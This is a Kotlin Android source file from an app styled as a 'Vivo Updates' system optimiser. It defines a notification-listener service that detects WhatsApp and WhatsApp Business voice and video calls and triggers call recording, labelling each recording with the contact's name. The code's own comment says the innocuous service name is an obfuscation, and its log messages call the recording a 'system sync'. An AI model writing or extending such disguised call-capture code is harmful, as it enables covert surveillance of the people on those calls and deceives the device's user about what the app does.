/*
 * Vivo Updates: FOSS System optimization powered through ADB/Bridge Engine!
 *  Copyright (C) 2026-present Sahil-958
 */

package com.vupdates.system.updater.services.call

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.vupdates.system.updater.data.AppPreferences
import com.vupdates.system.updater.utils.AppLogger

/**
 * SystemEventSyncService is a [NotificationListenerService] that detects events from
 * third-party applications (like messaging apps) to trigger system syncs.
 * 
 * Obfuscated name for a service that listens for WhatsApp calls.
 */
class SystemEventSyncService : NotificationListenerService() {

    companion object {
        private const val TAG = "SCR:SystemEventSyncService"
        private const val PKG_WHATSAPP = "com.whatsapp"
        private const val PKG_WHATSAPP_BUSINESS = "com.whatsapp.w4b"
    }

    private lateinit var preferences: AppPreferences

    override fun onCreate() {
        super.onCreate()
        preferences = AppPreferences(this)
        AppLogger.d(TAG, "SystemEventSyncService created")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (!preferences.isThirdPartySyncEnabled()) return

        val pkg = sbn.packageName
        if (pkg != PKG_WHATSAPP && pkg != PKG_WHATSAPP_BUSINESS) return

        val notification = sbn.notification
        val extras = notification.extras
        
        // Detect if this is a call notification
        // 1. Check category (Standard Android API)
        val isCallCategory = notification.category == Notification.CATEGORY_CALL
        
        // 2. Check for "Ongoing call" or "Voice call" in text
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        
        val isWhatsAppCall = isCallCategory || 
                             text.contains("Ongoing voice call", ignoreCase = true) ||
                             text.contains("Voice call", ignoreCase = true) ||
                             text.contains("Video call", ignoreCase = true)

        if (isWhatsAppCall) {
            AppLogger.i(TAG, "Detected third-party sync event from $pkg: $title")
            // Trigger sync (recording)
            // Use the title (usually the contact name) as the identifier
            CallSessionManager.getInstance(this).handleThirdPartySync(true, title)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        if (!preferences.isThirdPartySyncEnabled()) return

        val pkg = sbn.packageName
        if (pkg != PKG_WHATSAPP && pkg != PKG_WHATSAPP_BUSINESS) return

        // If a WhatsApp call notification is removed, it usually means the call ended
        // We trigger a "Stop" event. CallSessionManager handles if a session is actually active.
        AppLogger.i(TAG, "Third-party notification removed from $pkg. Signaling sync end.")
        CallSessionManager.getInstance(this).handleThirdPartySync(false, null)
    }
}
